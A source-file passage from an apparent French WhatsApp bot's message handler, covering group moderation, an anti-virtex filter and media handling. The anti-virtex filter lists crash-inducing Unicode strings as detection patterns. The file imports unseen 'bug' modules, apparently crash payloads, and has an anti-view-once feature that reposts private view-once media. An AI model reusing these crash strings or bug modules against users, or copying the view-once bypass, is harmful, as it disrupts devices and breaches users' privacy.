//Fait par Kenv/Le fin stratege
//credited by DGXeon
//YouTube: @Kenvofc
//Instagram: kenv8070
//GitHub: @kenvofc
//WhatsApp: +237656774511

process.on('unhandledRejection', console.error)
process.on('uncaughtException', console.error)
require('./params');
const fs = require('fs');
const os = require('os');
const util = require('util');
const jimp = require('jimp');
const path = require('path');
const https = require('https');
const fse = require('fs-extra');
const axios = require('axios');
const chalk = require('chalk');
const yts = require('yt-search');
const ytdl = require('@distube/ytdl-core');
const cron = require('node-cron');
const cheerio = require('cheerio');
const request = require('request');
const maker = require('mumaker');
const fetch = require('node-fetch');
const FileType = require('file-type');
const { JSDOM } = require('jsdom');
const agent = require('superagent');
const webp = require('node-webpmux');
const ffmpeg = require('fluent-ffmpeg');
const speed = require('performance-now');
const { performance } = require('perf_hooks');
const moment = require('moment-timezone');
const { exec, spawn, execSync } = require('child_process');
const googleTTS = require('google-tts-api');
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const fsx = require('fs-extra');
const fg = require('api-dylux');
const { download } = require('aptoide-scraper');
const scp2 = require('./bibliotheque/scraper2');
const jsobfus = require('javascript-obfuscator');
const {translate} = require('@vitalets/google-translate-api');
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, getBinaryNodeChildren, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, downloadContentFromMessage} = require('@whiskeysockets/baileys');

let ntnsfw = JSON.parse(fs.readFileSync('./recherche/nsfw.json'))
let bad = JSON.parse(fs.readFileSync('./recherche/badword.json'))

//bug database
const { pluton1 } = require('./KevBugFonc/pluton1')
const { satan2 } = require('./KevBugFonc/satan2')
const { poseidon3 } = require('./KevBugFonc/poseidon3')
const { saturne4 } = require('./KevBugFonc/saturne4')
const { jupiter5 } = require('./KevBugFonc/jupiter5')
const { mercury6 } = require('./KevBugFonc/mercury6')
const { stmars7 } = require('./KevBugFonc/stmars7')
const { uranus8 } = require('./KevBugFonc/uranus8')
const { lordusopp9 } = require('./KevBugFonc/lordusopp9')
const { cupidon10 } = require('./KevBugFonc/cupidon10')
const wkwk = fs.readFileSync(`./KevBugFonc/k.mp3`)
const kevsteek = fs.readFileSync(`./KevBugFonc/k.webp`)
const o = fs.readFileSync(`./KevBugFonc/o.jpg`)

//media
const VoiceNoteKev = JSON.parse(fs.readFileSync('./KevFile/database/kevvn.json'));
const StickerKev = JSON.parse(fs.readFileSync('./KevFile/database/KevSticker.json'));
const ImageKev = JSON.parse(fs.readFileSync('./KevFile/database/kevimage.json'));
const VideoKev = JSON.parse(fs.readFileSync('./KevFile/database/kevvideo.json'));
const DocKev = JSON.parse(fs.readFileSync('./KevFile/database/doc.json'));
const ZipKev = JSON.parse(fs.readFileSync('./KevFile/database/zip.json'));
const ApkKev = JSON.parse(fs.readFileSync('./KevFile/database/apk.json'));

const prem = require('./recherche/premium');
const owner = JSON.parse(fs.readFileSync('./recherche/owner.json'));
const { TelegraPh, UploadFileUgu } = require('./bibliotheque/uploader');
const uploadImage = require('./bibliotheque/uploadImage');
const {
    toAudio,
    toPTT,
    toVideo,
    addExifAvatar,
    makeid,
  Telesticker,
  formatBytes,
  formatDuration
} = require('./bibliotheque/converter');
const { 
addResponList, 
delResponList, 
isAlreadyResponList, 
isAlreadyResponListGroup, 
sendResponList, 
updateResponList, 
getDataResponList 
} = require('./bibliotheque/list');
const { xvideosSearch, xvideosdl, xnxxdl, xnxxSearch} = require('./bibliotheque/scraper3.js');
const { imageToWebp, videoToWebp, writeExif, writeExifImg, writeExifVid } = require('./bibliotheque/exif');
const { chatGpt, tiktokDl, ytMp4, ytMp3 } = require('./bibliotheque/screaper');
const { gameSlot, gameCasinoSolo, gameMerampok, gameTangkapOr, daily, transferLimit, transferUang, buy, setLimit, setUang } = require('./bibliotheque/game');
const { pinterest, wallpaper, wikimedia, quotesAnime, happymod, umma, ringtone, jadwalsholat, styletext } = require('./bibliotheque/scraper');
const { formatp, formatDate, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, webApi, parseMention, generateProfilePicture, getRandom, getGroupAdmins, readFileTxt, readFileJson, getHashedPassword, generateAuthToken, generateToken, batasiTeks, randomText, isEmoji, getAllHTML, fetchBuffer, GIFBufferToVideoBuffer } = require('./bibliotheque/function');
// Read Database
let vote = db.others.vote = []
const kevverifieduser = JSON.parse(fs.readFileSync('./recherche/user.json'));
const premium = JSON.parse(fs.readFileSync('./database/premium.json'));

//store database
const db_respon_list = JSON.parse(fs.readFileSync('./recherche/store/list.json'))

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
			users: {},
			groups: {},
			database: {},
			 settings: {},
			others: {},
...(global.db || {})
}

module.exports = Kev = async (Kev, m, chatUpdate, store) => {
	try {
		const {
            type
        } = m
        const botNumber = await Kev.decodeJid(Kev.user.id)
        const TontonKev = isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
		const body = (m.type === 'conversation') ? m.message.conversation : (m.type == 'imageMessage') ? m.message.imageMessage.caption : (m.type == 'videoMessage') ? m.message.videoMessage.caption : (m.type == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.type == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.type == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.type == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.type === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
		const budy = (typeof m.text == 'string' ? m.text : '')
		const prefix = /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : '.'
		const isCmd = body.startsWith(prefix)
		//prefix 2
        const pric = /^#.¦|\\^/.test(body) ? body.match(/^#.¦|\\^/gi) : kevprefix
        const Kevinoubody = body.startsWith(pric)
        const isCommand = Kevinoubody ? body.replace(pric, '').trim().split(/ +/).shift().toLowerCase() : ""
		const args = body.trim().split(/ +/).slice(1)
		const getQuoted = (m.quoted || m)
		const quoted = (getQuoted.type == 'buttonsMessage') ? getQuoted[Object.keys(getQuoted)[1]] : (getQuoted.type == 'templateMessage') ? getQuoted.hydratedTemplate[Object.keys(getQuoted.hydratedTemplate)[1]] : (getQuoted.type == 'product') ? getQuoted[Object.keys(getQuoted)[0]] : m.quoted ? m.quoted : m
		const command = TontonKev ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : isCmd ? body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase() : ''
		const text = q = args.join(' ')
		const mime = (quoted.msg || quoted).mimetype || ''
		const qmsg = (quoted.msg || quoted)
		const sender = m.sender
		const isUser = kevverifieduser.includes(sender)
		const groupMetadata = m.isGroup ? await Kev.groupMetadata(m.chat).catch(e => {}) : ''
		const participants = m.isGroup ? await groupMetadata.participants : ''
		if (m.isGroup) {
			m.metadata = await Kev.groupMetadata(m.chat)
			m.admins = (m.metadata.participants.reduce((a, b) => (b.admin ? a.push({ id: b.id, admin: b.admin }) : [...a]) && a, []))
			m.isAdmin = m.admins.some((b) => b.id === m.sender)
			m.participant = m.key.participant
			m.isBotAdmin = !!m.admins.find((member) => member.id === botNumber)
		}
		
		//media
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
        const isVideo = (type == 'videoMessage')
        const isAudio = (type == 'audioMessage')
        const isDocument = (type == 'documentMessage')
        const isLocation = (type == 'locationMessage')
        const isContact = (type == 'contactMessage')
        const isSticker = (type == 'stickerMessage')
        const isText = (type == 'textMessage')
        const isQuotedText = type === 'extendexTextMessage' 
        const isQuotedImage = type === 'extendedTextMessage' 
        const isQuotedLocation = type === 'extendedTextMessage' 
        const isQuotedVideo = type === 'extendedTextMessage' 
        const isQuotedSticker = type === 'extendedTextMessage'
        const isQuotedAudio = type === 'extendedTextMessage' 
        const isQuotedContact = type === 'extendedTextMessage' 
        const isQuotedDocument = type === 'extendedTextMessage'
		//anti media
        const isKevMedia = m.mtype
        
        //bug
        const clientId = Kev.user.id.split(':')[0];
        const senderbot = m.key.fromMe ? Kev.user.id.split(':')[0] + "@s.whatsapp.net" || Kev.user.id : m.key.participant || m.key.remoteJid;
        const senderId = senderbot.split('@')[0];
        const isBot = clientId.includes(senderId);
		
		try {
		const isNumber = x => typeof x === 'number' && !isNaN(x)
		const isBoolean = x => typeof x === 'boolean' && Boolean(x)
		let user = global.db.users[m.sender]
		let limitUser = user ? (user.vip ? global.limit.vip : prem.checkPremiumUser(m.sender, premium) ? global.limit.premium : global.limit.free) : prem.checkPremiumUser(m.sender, premium) ? global.limit.premium : global.limit.free
		let uangUser = user ? (user.vip ? global.uang.vip : prem.checkPremiumUser(m.sender, premium) ? global.uang.premium : global.uang.free) : prem.checkPremiumUser(m.sender, premium) ? global.uang.premium : global.uang.free
		if (typeof user !== 'object') global.db.users[m.sender] = {}
		if (user) {
			if (!('vip' in user)) user.afkReason = false
			if (!isNumber(user.afkTime)) user.afkTime = -1
			if (!('afkReason' in user)) user.afkReason = ''
			if (!isNumber(user.limit)) user.limit = limitUser
			if (!('uang' in user)) user.uang = uangUser
			if (!('lastclaim' in user)) user.lastclaim = new Date * 1
			if (!('lastrampok' in user)) user.lastrampok = new Date * 1
		} else {
			global.db.users[m.sender] = {
				vip: false,
				afkTime: -1,
				afkReason: '',
				limit: limitUser,
				uang: uangUser,
				lastclaim: new Date * 1,
				lastrampok: new Date * 1,
			}
		}
			let group = global.db.groups[m.chat]
			if (typeof group !== 'object') global.db.groups[m.chat] = {}
			if (group) {
				if (!('ntnsfw' in group)) group.ntnsfw = false
				  if (!('welcome' in group)) group.welcome = false
                  if (!('setinfo' in group)) group.setinfo = false
				  if (!('badword' in group)) group.badword = false
                  if (!('antiforeignnum' in group)) group.antiforeignnum = false
                  if (!('antibot' in group)) group.antibot = false
                  if (!('antiviewonce' in group)) group.antiviewonce = false
                  if (!('antispam' in group)) group.antispam = false
                  if (!('antimedia' in group)) group.media = false
                  if (!('antivirtex' in group)) group.antivirtex = false
                  if (!('antiimage' in group)) group.antiimage = false
                  if (!('antivideo' in group)) group.video = false
                  if (!('antiaudio' in group)) group.antiaudio = false
                  if (!('antipoll' in group)) group.antipoll = false
                  if (!('antisticker' in group)) group.antisticker = false
                  if (!('anticontact' in group)) group.anticontact = false
                  if (!('antilocation' in group)) group.antilocation = false
                  if (!('antidocument' in group)) group.antidocument = false
                  if (!('antilink' in group)) group.antilink = false
                  if (!('antipromotion' in group)) group.antipromotion = false
                  if (!('antidelete' in group)) group.antidelete = true
			} else {
				global.db.groups[m.chat] = {
				  ntsfw: false,
				  welcome: false,
				  setinfo: false,
				  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antispam: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antipromotion: false,
                  antidelete: true
				}
			}
		    let setting = global.db.settings[botNumber]
            if (typeof setting !== 'object') global.db.settings[botNumber] = {}
            if (setting) {
            	if (!('anticall' in setting)) setting.anticall = false
               if (!('antiswview' in setting)) setting.antiswview = false
               if (!('totalhit' in setting)) setting.totalhit = 0
               if (!('totalError' in setting)) setting.totalError = 0
               if (!('online' in setting)) setting.online = false 
               if (!('autosticker' in setting)) setting.autosticker = false 
               if (!('autodownload' in setting)) setting.autodownload = false 
               if (!('autobio' in setting)) setting.autobio = false 
               if (!('autoread' in setting)) setting.autoread = false
               if (!('autorecordtype' in setting)) setting.autorecordtype = false
               if (!('autorecord' in setting)) setting.autorecord = false
               if (!('autotype' in setting)) setting.autotype = false
               if (!('autoblocknum' in setting)) setting.autoblocknum = false
               if (!('onlyindia' in setting)) setting.onlyindia = false
               if (!('onlyindo' in setting)) setting.onlyindo = false
               if (!('onlygrub' in setting)) setting.onlygrub = false
               if (!('onlypc' in setting)) setting.onlypc = false
            } else global.db.settings[botNumber] = {
               anticall: false,
           	antiswview: false,
               totalhit: 0,
               totalError: 0,
               online: false,
               autosticker: false,
               autodownload: false,
               autobio: false,
               autoread: false,
               autoblocknum: false,
               onlyindia: false,
               onlyindo: false,
               onlygrub: false,
               onlypc: false,
               autorecordtype: false,
               autorecord: false,
               autotype: false,               
            }
	} catch (e) {
		throw e;
	}
		
		const isVip = global.db.users[m.sender] ? global.db.users[m.sender].vip : false
		const isPremium = TontonKev || prem.checkPremiumUser(m.sender, premium) || false
		const AntiNsfw = m.isGroup ? global.db.groups[m.chat].ntnsfw : false
		
		function pickRandom(list) {
			return list[Math.floor(list.length * Math.random())]
		}
		
		// Reset Limit
		cron.schedule('00 00 * * *', () => {
			let user = Object.keys(global.db.users)
			for (let jid of user) {
				const limitUser = global.db.users[jid].vip ? global.limit.vip : prem.checkPremiumUser(jid, premium) ? global.limit.premium : global.limit.free
				global.db.users[jid].limit = limitUser
				console.log('Limit Reseted')
			}
		}, {
			scheduled: true,
			timezone: 'Africa/Abidjan'
		})
		
		if (!Kev.public) {
			if (TontonKev && !m.key.fromMe) return
		}
		
		//Log
		if (m.message) {
			console.log(chalk.black.bgWhite('[ MESSAGE ]:'),chalk.black.bgGreen(new Date), chalk.black.bgHex('#00EAD3')(budy || m.type) + '\n' + chalk.black(chalk.bgCyanBright('[ FROM ] :'),chalk.bgYellow(m.pushName),chalk.bgHex('#FF449F')(m.sender),chalk.bgBlue('(' + (m.isGroup ? m.pushName : 'Private Chat', m.chat) + ')')));
		}
		
		// Grup Only
        if (!m.isGroup && !TontonKev && db.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return replygckev(`Hey bro! parce qu on veut reduire les risques de spam, veuillez utiliser le bot dans un groupe de discussion !\n\nveuillez contacter le proprio au cas ou vous n avez pas d issues wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!TontonKev && db.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return replygckev("Hey! Veuillez utiliser le bot dans une conversation privee")
	     }
	}
		
		// Auto Read
		if (db.settings[botNumber].autoread) {
            Kev.readMessages([m.key]);
        }
        
        //auto set bio\\
	if (db.settings[botNumber].autobio) {
            Kev.updateProfileStatus(`${botname} En Ligne Depuis ${runtime(process.uptime())}`).catch(_ => _)
        }
        
        //auto type
        if (db.settings[botNumber].autotype){
        if (m.message) {
        	let kevpos = ['composing']
            Kev.sendPresenceUpdate(kevpos, m.chat)
        }
        }
        
        //auto type record
        if (db.settings[botNumber].autorecordtype){
        if (m.message) {
            let kevmix = ['composing', 'recording']
            kevmix2 = kevmix[Math.floor(kevmix.length * Math.random())]
            Kev.sendPresenceUpdate(kevmix2, m.chat)
        }
        }
        
        //autorecord
        if (db.settings[botNumber].autorecord){
        if (m.message) {
        	let kevpos = ['recording']
            Kev.sendPresenceUpdate(kevpos, m.chat)
        }
        }
        
        //unavailable
        if (db.settings[botNumber].online) {
        	if (isCmd) {
        	Kev.sendPresenceUpdate('unavailable', m.chat)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.settings[botNumber].autoblocknum === true) {
            return Kev.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.settings[botNumber].onlyindia === true) {
            return Kev.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.settings[botNumber].onlyindo === true) {
            return Kev.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.groups[m.chat].antiforeignnum === true){ 
        	if (TontonKev || m.isAdmin || !m.isBotAdmin) return
            Kev.sendMessage(m.chat, { text: `Sorry Vous serez off parce que l.admin a activey l.anti foreign dans ce groupe, seuls les +${antiforeignnumber} sont autoriseys a rejoindre le groupe` }, {quoted: m})
            await sleep(2000)
            await Kev.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        
        //download status #ctto
        try {
  const textLower = m.text.toLowerCase();
  if (textLower === 'download' || textLower === 'statusdown' || textLower === 'take' || textLower === 'send') {
    const quotedMessage = m.msg.contextInfo.quotedMessage;
    if (quotedMessage) {
      if (quotedMessage.imageMessage) {
        let imageCaption = quotedMessage.imageMessage.caption;
        let imageUrl = await Kev.downloadAndSaveMediaMessage(quotedMessage.imageMessage);
        Kev.sendMessage(m.chat, { image: { url: imageUrl }, caption: imageCaption });
        replygckev('*Encours de relechargement...*');
      }
      if (quotedMessage.videoMessage) {
        let videoCaption = quotedMessage.videoMessage.caption;
        let videoUrl = await Kev.downloadAndSaveMediaMessage(quotedMessage.videoMessage);
        Kev.sendMessage(m.chat, { video: { url: videoUrl }, caption: videoCaption });
        replygckev('*Encours de telechargement...*');
      }
    }
  }
} catch (error) {
  console.error("Error in 'send message' handling:", error);
}
        
        //autosticker
        if (db.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                Kev.sendImageAsSticker(m.chat, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                Kev.sendVideoAsSticker(m.chat, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        //antibot
        if (db.groups[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (m.isAdmin || !m.m.isBotAdmin){		  
        } else {
          replygckev(`*Bot Merdique Detectey*\n\nNous n acceptons pas de bots ayant un manque d elegance ici!!!`)
    return await Kev.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
   
		//antiviewonce
    if ( db.groups[m.chat].antiviewonce && m.isGroup && m.mtype == "viewOnceMessageV2") {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await Kev.sendMessage(m.chat, { forward: val }, { quoted: m })    	
    }
    
    // Anti promotion
if (db.groups[m.chat].antipromotion) {
if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel5kpm|open jasa push member grup|yangmaubuypanelpm|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list harga panel by|list harga vps|LIST HARGA VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST HARGA PANEL BY|list harga panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|OPEN JASA INSTALL|open jasa installMENYEDIAKAN JASA INSTALL|menyediakan jasa install`)) {
if (!m.isBotAdmin) return
if(TontonKev) return
if (m.isAdmin) return
Kev.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
Kev.sendMessage(m.chat, {text:`\`\`\`「 Promotion Detectee 」\`\`\`\n\n@${m.sender.split("@")[0]} a fait une promotion et le random concerney a ete demis`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}

//respond
        if (db.groups[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  Kev.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			Kev.sendMessage(m.chat, {text:`\`\`\`「 Gros Mot Detectey 」\`\`\`\n\n@${m.sender.split("@")[0]} a dut un gros mot et ce mot a aussi rot etd supprimey`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }

//ANTI VIRUS
if (m.isGroup && db.groups[m.chat].antivirtex) {
if (budy.includes('๒๒๒๒') || budy.includes('ดุ') || budy.includes('ผิดุท้เึางืผิดุท้เึางื') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('৭৭৭৭৭৭৭৭') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ผดิทุเ้ึางผืดิทุเ้') || budy.includes('.*࡞ࣰࣰࣰࣲࣲࣲࣲࣩࣩࣩࣩࣶࣶ࣯࣯࣮࣮ࣦ࣯ࣨࣨࣨࣻࣻࣻࣼࣼࣼࣽࣽࣾࣷࣵࣴ࣬࣬࣬ࣤࣤࣧࣧ*') || budy.includes('᥋') || budy.includes('؁') || budy.includes('ٯٯٯٯٯ') ) {
if (m.isBotAdmin) return replygckev('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
Kev.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!m.m.isBotAdmin) return
if(TontonKev) return
Kev.groupParticipantsUpdate(m.chat, [sender], 'remove')
await Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
Kev.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hey Bosss! wa.me/${sender.split("@")[0]} Detectey  avoir send un virtex merdique ${isGroup?`dans ${groupName}`:''}`})
 }
 }
    
    //anti media
        if (db.groups[m.chat].antimedia && isMedia) {
        if (TontonKev || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygckev(`\`\`\`「 Media Detectey 」\`\`\`\n\nSorry, mais j'suis dans l obligation de supprimer cela, Parce que l admin a activey l anti media dans ce groupe`)
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.groups[m.chat].image && isKevMedia) {
    if(isKevMedia === "imageMessage"){
        if (TontonKev || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygckev(`\`\`\`「 Image Detectee 」\`\`\`\n\nSorry, mais j'suis dans l obligation de supprimer cela, Parce que l admin a activey l anti image dans ce groupe`)
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.groups[m.chat].antivideo && isKevMedia) {
    if(isKevMedia === "videoMessage"){
        if (TontonKev || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygckev(`\`\`\`「 Video Detectee 」\`\`\`\n\nSorry, mais j'suis dans l obligation de supprimer cela, Parce que l admin a activey l anti video dans ce groupe`)
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.groups[m.chat].antisticker && isKevMedia) {
    if(isKevMedia === "stickerMessage"){
        if (TontonKev || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygckev(`\`\`\`「 Sticker Detectey 」\`\`\`\n\nSorry, mais j'suis dans l obligation de supprimer cela, Parce que l admin a activey l anti sticker dans ce groupe`)
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.groups[m.chat].antiaudio && isKevMedia) {
    if(isKevMedia === "audioMessage"){
        if (TontonKev || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygckev(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.groups[m.chat].antipoll && isKevMedia) {
    if(isKevMedia === "pollCreationMessage"){
        if (TontonKev || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygckev(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.groups[m.chat].antilocation && isKevMedia) {
    if(isKevMedia === "locationMessage"){
        if (TontonKev || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygckev(`\`\`\`「 Localisation Detectee」\`\`\`\n\nSorry, mais j'suis dans l obligation de supprimer cela, Parce que l admin a activey l anti localisation dans ce groupe`)
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.groups[m.chat].antidocument && isKevMedia) {
    if(isKevMedia === "documentMessage"){
        if (TontonKev || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygckev(`\`\`\`「 Document Detectee 」\`\`\`\n\nSorry, mais j'suis dans l obligation de supprimer cela, Parce que l admin a activey l anti document dans ce groupe`)
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.groups[m.chat].anticontact && isKevMedia) {
    if(isKevMedia === "contactMessage"){
        if (TontonKev || m.isAdmin || !m.isBotAdmin){		  
        } else {
          replygckev(`\`\`\`「 Contact Detectey 」\`\`\`\n\nSorry, mais j'suis dans l obligation de supprimer cela, Parce que l admin a activey l anti contact dans ce groupe`)
    return Kev.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
  
        if (db.groups[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detectey 」\`\`\`\n\nLien send par un admin, les admin sont les boss des lieux`
if (m.isAdmin) return replygckev(bvl)
